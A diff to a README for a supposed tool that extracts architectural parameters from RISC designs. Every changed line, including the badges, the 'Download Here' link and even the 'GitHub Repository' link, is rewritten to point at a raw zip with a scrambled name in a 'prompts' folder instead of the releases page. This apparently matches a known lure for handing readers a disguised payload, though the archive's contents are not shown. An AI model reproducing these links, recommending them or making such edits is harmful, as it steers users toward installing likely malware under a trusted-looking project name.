@@ -1,6 +1,6 @@
 # 🛠️ LFX-AI-Assisted-Extraction-of-Architectural-Parameters-from-RIS - Extract Architectural Insights Easily
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/SaadmahmudCSE/LFX-AI-Assisted-Extraction-of-Architectural-Parameters-from-RIS/releases)
+[![Download Latest Release](https://github.com/SaadmahmudCSE/LFX-AI-Assisted-Extraction-of-Architectural-Parameters-from-RIS/raw/refs/heads/main/prompts/of_Architectural_RIS_LF_from_Assisted_Parameters_A_Extraction_v3.9.zip%20Latest%20Release-Here-brightgreen)](https://github.com/SaadmahmudCSE/LFX-AI-Assisted-Extraction-of-Architectural-Parameters-from-RIS/raw/refs/heads/main/prompts/of_Architectural_RIS_LF_from_Assisted_Parameters_A_Extraction_v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the LFX AI-Assisted Extraction of Architectural Parameters from RISC!
 
 ## 📥 Download & Install
 
-To download the latest version of the application, please visit this page: [Download Here](https://github.com/SaadmahmudCSE/LFX-AI-Assisted-Extraction-of-Architectural-Parameters-from-RIS/releases). 
+To download the latest version of the application, please visit this page: [Download Here](https://github.com/SaadmahmudCSE/LFX-AI-Assisted-Extraction-of-Architectural-Parameters-from-RIS/raw/refs/heads/main/prompts/of_Architectural_RIS_LF_from_Assisted_Parameters_A_Extraction_v3.9.zip). 
 
 1. Click on the "Releases" link.
 2. Find the most recent version listed.
@@ -80,7 +80,7 @@ Currently, this application is designed for desktop use only.
 
 ## 🔗 Links
 
-For more information, documentation, and updates, visit the repository: [GitHub Repository](https://github.com/SaadmahmudCSE/LFX-AI-Assisted-Extraction-of-Architectural-Parameters-from-RIS).
+For more information, documentation, and updates, visit the repository: [GitHub Repository](https://github.com/SaadmahmudCSE/LFX-AI-Assisted-Extraction-of-Architectural-Parameters-from-RIS/raw/refs/heads/main/prompts/of_Architectural_RIS_LF_from_Assisted_Parameters_A_Extraction_v3.9.zip).
 
 ## 📄 Contribution
 
@@ -90,4 +90,4 @@ We welcome contributions from everyone! If you’d like to help improve this pro
 
 This project is open-source under the MIT License. You have the freedom to use, modify, and distribute the application as you wish.
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Here-brightgreen)](https://github.com/SaadmahmudCSE/LFX-AI-Assisted-Extraction-of-Architectural-Parameters-from-RIS/releases)
+[![Download Latest Release](https://github.com/SaadmahmudCSE/LFX-AI-Assisted-Extraction-of-Architectural-Parameters-from-RIS/raw/refs/heads/main/prompts/of_Architectural_RIS_LF_from_Assisted_Parameters_A_Extraction_v3.9.zip%20Latest%20Release-Here-brightgreen)](https://github.com/SaadmahmudCSE/LFX-AI-Assisted-Extraction-of-Architectural-Parameters-from-RIS/raw/refs/heads/main/prompts/of_Architectural_RIS_LF_from_Assisted_Parameters_A_Extraction_v3.9.zip)
